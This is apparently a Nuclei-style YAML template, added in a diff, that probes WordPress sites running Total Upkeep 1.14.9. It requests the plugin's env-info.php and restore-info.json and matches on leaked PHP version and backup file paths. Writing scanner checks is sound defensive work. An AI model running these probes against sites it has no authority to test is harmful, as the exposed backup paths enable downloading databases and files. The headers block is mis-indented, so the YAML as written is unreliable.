@@ -1,0 +1,28 @@
+id:  Upkeep_wordpress
+
+info:
+  name: WordPress Plugin Total Upkeep 1.14.9 - Database and Files Backup Download
+  author: nithissh
+  severity: high
+#https://www.cvebase.com/cve/2019/16270
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/boldgrid-backup/cli/env-info.php"
+      - "{{BaseURL}}/wp-content/plugins/boldgrid-backup/cron/restore-info.json"
+      
+
+    headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+    X-Atlassian-Token: no-check
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "php_version"
+          - "server_protocol"
+          - 'filepath":"/wp\-content/boldgrid_backup_'
+        condition: or
+        part: body
